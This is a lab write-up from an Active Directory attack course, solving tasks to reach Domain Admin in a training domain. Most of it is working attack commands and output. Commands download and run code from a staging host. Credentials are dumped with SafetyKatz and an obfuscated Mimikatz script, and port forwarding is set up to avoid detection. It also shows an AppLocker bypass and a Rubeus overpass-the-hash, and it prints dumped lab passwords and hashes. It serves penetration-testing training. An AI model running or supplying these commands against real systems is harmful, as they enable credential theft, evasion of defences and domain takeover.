---
icon: vial
---

# 7 - Learning Object 7️

## Tasks



1 - Identify a machine in the target domain where a Domain Admin session is available

2 - Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci

3 - Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using:

* Gaps in Applocker rules.
* Disable Applocker by modifying GPO applicable to dcorp-adminsrv.

Flag 10 \[dcorp-mgmt] - Process using svcadmin as service account 🚩

Flag 11 \[dcorp-mgmt] - NTLM hash of svcadmin account 🚩

Flag 12 \[dcorp-adminsrv] - We tried to extract clear-text credentials for scheduled tasks from? Flag value is like lsass, registry, credential vault etc 🚩

Flag 13 \[dcorp-adminsrv] - NTLM hash of srvadmin extracted from dcorp-adminsrv 🚩

Flag 14 \[dcorp-adminsrv] - NTLM hash of websvc extracted from dcorp-adminsrv 🚩

Flag 15 \[dcorp-adminsrv] - NTLM hash of appadmin extracted from dcorp-adminsrv 🚩



## Solutions

### 1 - Identify a machine in the target domain where a Domain Admin session is available.

Start InviShell and PowerView

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Verify Domain Admin session available using: Invoke-SessionHunter

```powershell
. C:\AD\Tools\Invoke-SessionHunter.ps1
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```

<figure><img src="../../.gitbook/assets/image (207).png" alt=""><figcaption></figcaption></figure>

```powershell
HostName       UserSession                Access
--------       -----------                ------
dcorp-adminsrv dcorp\appadmin               True
dcorp-adminsrv dcorp\srvadmin               True
dcorp-adminsrv dcorp\websvc                 True
```

### 2 - Compromise the machine and escalate privileges to Domain Admin by abusing reverse shell on dcorp-ci

As we see into [Learning Object 5](5-learning-object-5.md) we can obtain a reverse shell on dcorp-ci using through a vulnerability of Jenkins.

After repeating the same steps, we got a reverse shell on dcorp-ci as ciadmin by abusing Jenkins, transfer program present into Tools (PowerView, Loader, Invoke-PowerShellTcp, SafetyKatz and sbloggingbypass.txt):

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Starting to download the following file/programs, and execute Find-DomainUserLocation

```powershell
iex (iwr http://172.16.100.67/sbloggingbypass.txt -UseBasicParsing)
```

```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.67/PowerView.ps1'))
Find-DomainUserLocation
```

```powershell
UserDomain      : DCORP-CI
UserName        : Administrator
ComputerName    : dcorp-ci.dollarcorp.moneycorp.local
IPAddress       : 172.16.3.11
SessionFrom     :
SessionFromName :
LocalAdmin      :

UserDomain      : dcorp
UserName        : svcadmin
ComputerName    : dcorp-mgmt.dollarcorp.moneycorp.local
IPAddress       : 172.16.4.44
SessionFrom     :
SessionFromName :
LocalAdmin      :
```

There is a domain admin session on dcorp-mgmt server, we can abuse this using winrs:

```powershell
winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

```powershell
COMPUTERNAME=DCORP-MGMT
USERNAME=ciadmin
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Now, the idea is to extract credentials from it, we can do it using SafetyKatz.exe, to do that, we need to copy Loader.exe on dcorp-mgmt.

* Download Loader.exe on dcorp-ci
* Copy it from there to dcorp-mgmt.

Run the following command on the reverse shell:

```powershell
iwr http://172.16.100.67/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Copy the Loader.exe to dcorp-mgmt:

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../../.gitbook/assets/image (209).png" alt=""><figcaption></figcaption></figure>

Using winrs, add the following port forwarding on dcorp-mgmt to avoid detection on dcorp-mgmt:

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
```

We're using the $null variable to address output redirection issues.\


To run SafetyKatz on dcorp-mgmt, we will download and execute it in-memory using the Loader. Run the following command on the reverse shell:

```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

```powershell
Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8
```

<figure><img src="../../.gitbook/assets/image (211).png" alt=""><figcaption></figcaption></figure>

We got credentials of svcadmin, a domain administrator. Remember that svcadmin is used as a service account (see "Session" in the above output), so you can even get credentials in clear-text from lsasecrets.

```powershell
Authentication Id : 0 ; 6198905 (00000000:005e9679)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/11/2025 4:24:00 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(?yWE8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41*/$^4+EeZ07?zF2Z3:[Jd*F/z_Pp6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 6155000 (00000000:005deaf8)
Session           : Interactive from 0
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:16:32 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

Authentication Id : 0 ; 57471 (00000000:0000e07f)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:51 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(?yWE8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41*/$^4+EeZ07?zF2Z3:[Jd*F/z_Pp6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-20

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 6218420 (00000000:005ee2b4)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:24:18 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 21275 (00000000:0000531b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(?yWE8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41*/$^4+EeZ07?zF2Z3:[Jd*F/z_Pp6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754
Authentication Id : 0 ; 21242 (00000000:000052fa)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(?yWE8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41*/$^4+EeZ07?zF2Z3:[Jd*F/z_Pp6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:45 AM
SID               : S-1-5-18

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754
```

Now, we can use OverPass-the-Hash to replay svcadmin credentials

Run the following command from a new elevated shell on the student VM to use Rubeus.

```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../../.gitbook/assets/image (186).png" alt=""><figcaption></figcaption></figure>

### 3 - Escalate privilege to DA by abusing derivative local admin through dcorp-adminsrv. On dcorp-adminsrv, tackle application allowlisting using:

We need to escalate to domain admin using derivative local admin. Find out the machines on which we have local admin privileges.

```powershell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
PS C:\Users\student867> Find-PSRemotingLocalAdminAccess
```

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

Our result is: dcorp-adminsrv ant there's an output error message.

### 3.1 - Gaps in Applocker rules.

Let's check if Applocker is configured on dcorp-adminsrv by querying registry keys. Note that we are assuming that reg.exe is allowed to execute:

```powershell
winrs -r:dcorp-adminsrv cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

<figure><img src="../../.gitbook/assets/image (189).png" alt=""><figcaption></figcaption></figure>

The Applocker is configured and after going through the policies, we can understand that Microsoft Signed binaries and scripts are allowed for all the users but nothing else.

However, this particular rule is overly permissive!

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

<figure><img src="../../.gitbook/assets/image (190).png" alt=""><figcaption></figcaption></figure>

A default rule is enabled that allows everyone to run scripts from the C:\ProgramFiles folder.

We can also confirm this using PowerShell commands on dcrop-adminsrv in a PowerShell session as student867:

```powershell
Enter-PSSession dcorp-adminsrv
$ExecutionContext.SessionState.LanguageMode
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<figure><img src="../../.gitbook/assets/image (192).png" alt=""><figcaption></figcaption></figure>

'Everyone' can run scripts from the Program Files directory. That means, we can drop scripts in the Program Files directory there and execute them.&#x20;

We cannot run scripts using dot sourcing (. .\Invoke-Mimi.ps1), so we must modify Invoke-Mimi.ps1 to include the function call in the script itself and transfer the modified script (Invoke-MimiEx.ps1) to the target server.

#### Create Invoke-MimiEX-keys-std867.ps1:

* Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-keys-stdx.ps1 (where x is your student ID).
* Open Invoke-MimiEX-keys-std867.ps1 in PowerShell ISE (Right click on it and click Edit).
* Add the below encoded value for "sekurlsa::ekeys" to the end of the file.

```
$8 = "s";
$c = "e";
$g = "k";
$t = "u";
$p = "r";
$n = "l";
$7 = "s";
$6 = "a";
$l = ":";
$2 = ":";
$z = "e";
$e = "k";
$0 = "e";
$s = "y";
$1 = "s";
$Pwn = $8 + $c + $g + $t + $p + $n + $7 + $6 + $l + $2 + $z + $e + $0 + $s + $1 ;
Invoke-Mimi -Command $Pwn
```

<figure><img src="../../.gitbook/assets/image (193).png" alt=""><figcaption></figcaption></figure>

On student machine run the following command from a PowerShell session. Note that it will take several minutes for the copy process to complete.

```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEX-keys-std687.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

<figure><img src="../../.gitbook/assets/image (194).png" alt=""><figcaption></figcaption></figure>

Now, run the modified mimikatz script. Note that there is no dot sourcing here. It may take a couple of minutes for the script execution to complete:

```powershell
.\Invoke-MimiEX-keys-std867.ps1
```

```powershell
mimikatz(powershell) # sekurlsa::ekeys

Authentication Id : 0 ; 5853380 (00000000:005950c4)
Session           : RemoteInteractive from 2
User Name         : srvadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:22:58 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1115

         * Username : srvadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4
           rc4_hmac_nt       a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old      a98e18228819e8eec3dfa33cb68b0728
           rc4_md4           a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_nt_exp   a98e18228819e8eec3dfa33cb68b0728
           rc4_hmac_old_exp  a98e18228819e8eec3dfa33cb68b0728


```

Here we find the credentials of the dcorp-adminsrv$, appadmin and websvc users.

#### Create Invoke-MimiEX-vault-std687.ps1

In addition, there are other places to look for credentials. Let's modify Invoke-MimiEx and look for credentials from the Windows Credential Vault. On the student VM:

* Create a copy of Invoke-Mimi.ps1 and rename it to Invoke-MimiEx-vault-std687.ps1.
* Open Invoke-MimiEX-vault-stdx.ps1 in PowerShell ISE (Right click on it and click Edit).
* Replace "Invoke-Mimi -Command '"sekurlsa::ekeys"' " that we added earlier with "`Invoke-Mimi -Command '"token::elevate" "vault::cred /patch"'` " (without quotes).

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Copy Invoke-MimiEx-vault-stdx.ps1 to dcorp-adminsrv and run it. (It needs some minutes for copy process)

```powershell
Copy-Item C:\AD\Tools\Invoke-MimiEX-vault-std687.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

```powershell
.\Invoke-MimiEX-vault-std687.ps1
```

```powershell
mimikatz(powershell) # vault::cred /patch
TargetName : Domain:batch=TaskScheduler:Task:{D1FE8F15-FC32-486B-94BC-471E4B1C1BB9} / <NULL>
UserName   : dcorp\srvadmin
Comment    : <NULL>
Type       : 2 - domain_password
Persist    : 2 - local_machine
Flags      : 00004004
Credential : TheKeyUs3ron@anyMachine!
Attributes : 0
```

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

We got credentials for the srvadmin user in clear-text. Start a cmd process using runas (because we've cleartext credentials):

```powershell
runas /user:dcorp\srvadmin /netonly cmd
```

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Check if srvadmin has admin privileges on any other machine:

```powershell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

* dcorp-adminsrv
* dcorp-mgmt

We have local admin access on the dcorp-mgmt server as srvadmin and we already know a session of svcadmin is present on that machine.

Let's use SafetyKatz to extract credentials from the machine, first to all copy the Loader.exe to dcorp-mgmt:

```powershell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

add the portforwarding and extract credentials:

```powershell
winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

```powershell
Authentication Id : 0 ; 6198905 (00000000:005e9679)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/11/2025 4:24:00 AM
SID               : S-1-5-96-0-2

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 6155000 (00000000:005deaf8)
Session           : Interactive from 0
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:16:32 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 86511 (00000000:000151ef)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/10/2025 9:28:52 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1118

         * Username : svcadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : *ThisisBlasphemyThisisMadness!!
         * Key List :
           aes256_hmac       6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011
           aes128_hmac       8c0a8695795df6c9a85c4fb588ad6cbd
           rc4_hmac_nt       b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old      b38ff50264b74508085d82c69794a4d8
           rc4_md4           b38ff50264b74508085d82c69794a4d8
           rc4_hmac_nt_exp   b38ff50264b74508085d82c69794a4d8
           rc4_hmac_old_exp  b38ff50264b74508085d82c69794a4d8

Authentication Id : 0 ; 57471 (00000000:0000e07f)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:51 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-20

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 6218420 (00000000:005ee2b4)
Session           : RemoteInteractive from 2
User Name         : mgmtadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 1/11/2025 4:24:18 AM
SID               : S-1-5-21-719815819-3726368948-3917688648-1120

         * Username : mgmtadmin
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       902129307ec94942b00c6b9d866c67a2376f596bc9bdcf5f85ea83176f97c3aa
           rc4_hmac_nt       95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old      95e2cd7ff77379e34c6e46265e75d754
           rc4_md4           95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_nt_exp   95e2cd7ff77379e34c6e46265e75d754
           rc4_hmac_old_exp  95e2cd7ff77379e34c6e46265e75d754

Authentication Id : 0 ; 21275 (00000000:0000531b)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-96-0-0

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 21242 (00000000:000052fa)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:46 AM
SID               : S-1-5-96-0-1

         * Username : DCORP-MGMT$
         * Domain   : dollarcorp.moneycorp.local
         * Password : 4?PhChKP(`?yW`E8=VM2QI13O!i*3Q?WVB"X)=>Il3=AczJ0^T!X]r&:&yG41`*/$^4+EeZ07?zF2Z3`:[Jd*F/z_P`p6B9XH^g$*mXIQMXY(Sc?3\A6ICrX
         * Key List :
           aes256_hmac       c71f382ea61f80cab751aada32a477b7f9617f3b4a8628dc1c8757db5fdb5076
           aes128_hmac       b3b9f96ed137fb4c079dcfe2e23f7854
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DCORP-MGMT$
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 1/10/2025 9:28:45 AM
SID               : S-1-5-18

         * Username : dcorp-mgmt$
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
         * Key List :
           aes256_hmac       b607d794f87ca117a14353da0dbb6f27bbe9fed4f1ce1b810b43fbb9a2eab192
           rc4_hmac_nt       0878da540f45b31b974f73312c18e754
           rc4_hmac_old      0878da540f45b31b974f73312c18e754
           rc4_md4           0878da540f45b31b974f73312c18e754
           rc4_hmac_nt_exp   0878da540f45b31b974f73312c18e754
           rc4_hmac_old_exp  0878da540f45b31b974f73312c18e754
```

### 3.2 - Disable Applocker by modifying GPO applicable to dcorp-adminsrv.

The idea is to recall that we enumerated that studentx has Full Control/Generic All on the Applocked Group Policy and make changes to the Group Policy and disable Applocker on dcorp-adminsrv.

<figure><img src="../../.gitbook/assets/image (22).png" alt=""><figcaption><p>In this screen i used another student account because the BH web version aren't update</p></figcaption></figure>

We need the Group Policy Management Console for this. As the student VM is a Server 2022 machine, we can install it using the following steps: Open Server Manager -> Add Roles and Features -> Next -> Features -> Check Group Policy Management -> Next -> Install

<figure><img src="../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

After the installation is completed, start the gpmc. We need to start a process as student867 using runas, otherwise gpmc doesn't get the user context. Run the below command from an elevated shell:

```powershell
runas /user:dcorp\student687 /netonly cmd
```



```
